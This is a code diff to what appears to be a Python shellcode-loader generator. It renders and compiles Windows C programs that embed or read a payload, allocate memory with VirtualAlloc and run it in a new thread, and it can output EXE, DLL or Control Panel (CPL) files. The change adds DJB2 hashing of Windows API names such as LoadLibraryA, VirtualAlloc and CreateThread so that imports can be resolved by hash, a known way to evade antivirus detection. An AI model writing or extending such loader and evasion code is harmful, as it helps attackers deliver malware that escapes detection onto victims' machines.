@@ -5,6 +5,24 @@ import uuid
 import importlib
 from jinja2 import Environment, FileSystemLoader
 
+def _djb2_hash(s):
+    """Calculates the DJB2 hash for a given string."""
+    hash_val = 5381
+    for char in s:
+        hash_val = ((hash_val << 5) + hash_val) + ord(char)
+    return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer
+
+def _get_api_hashes():
+    """Returns a dictionary of all required API function and module names and their hashes."""
+    api_names = [
+        "KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL",
+        "LoadLibraryA", "VirtualAlloc", "CreateThread", "WaitForSingleObject",
+        "CloseHandle", "CreateFileMappingW", "MapViewOfFile", "GetProcessHeap",
+        "RtlAllocateHeap", "HeapFree", "CreateFileA", "GetFileSize", "ReadFile",
+        "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor"
+    ]
+    return {f"hash_{name.lower().replace('.', '_')}": _djb2_hash(name) for name in api_names}
+
 def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_artifact_filename):
     """A helper function to build the GCC compiler command list."""
     command = ["x86_64-w64-mingw32-gcc", "-O2"]
@@ -26,35 +44,35 @@ def _build_compiler_command(options, temp_c_filename, temp_def_filename, output_
 
 def encode(input_filepath, original_filename, options):
     """
-    Dynamically generates and compiles a C program, handling different data sources.
+    Dynamically generates and compiles a C program from user choices.
     """
     print(f"INFO: Starting Windows C embedder with options: {options}")
     
     temp_files_to_clean = []
     try:
-        data_source_choice = options.get('data_source', 'embedded')
-        template_vars = {
-            'data_source_partial': f"partials/datasource_{data_source_choice}.c.j2"
-        }
+        template_vars = {}
+        
+        api_resolver_choice = options.get('api_resolver', 'string')
+        template_vars['api_resolver'] = api_resolver_choice
+        if api_resolver_choice == 'hashed':
+            template_vars.update(_get_api_hashes())
 
+        data_source_choice = options.get('data_source', 'embedded')
+        template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
+        
         if data_source_choice == 'file':
             file_path = options.get('file_path', '').replace('\\', '\\\\')
             template_vars['file_path'] = file_path
             template_vars['bytecode_array'] = ""
-        else: # The payload is embedded...
+        else: # The payload is embedded
             with open(input_filepath, "rb") as f:
                 bytecode_to_embed = f.read()
             template_vars['bytecode_array'] = ", ".join([f"0x{byte:02x}" for byte in bytecode_to_embed])
-
-        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
-        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
-        template = env.get_template('base.c.j2')
 
         output_format = options.get('output_format', 'exe')
         export_name = 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer')
         
         template_vars.update({
-            'data_source': data_source_choice,
             'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
             'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
             'output_format': output_format,
@@ -64,6 +82,9 @@ def encode(input_filepath, original_filename, options):
             'bytecode_compression': options.get('bytecode_compression')
         })
 
+        template_dir = os.path.join(os.path.dirname(__file__), 'templates')
+        env = Environment(loader=FileSystemLoader(template_dir), trim_blocks=True, lstrip_blocks=True)
+        template = env.get_template('base.c.j2')
         c_source_code = template.render(**template_vars)
 
         temp_c_filename = f"{uuid.uuid4()}.c"
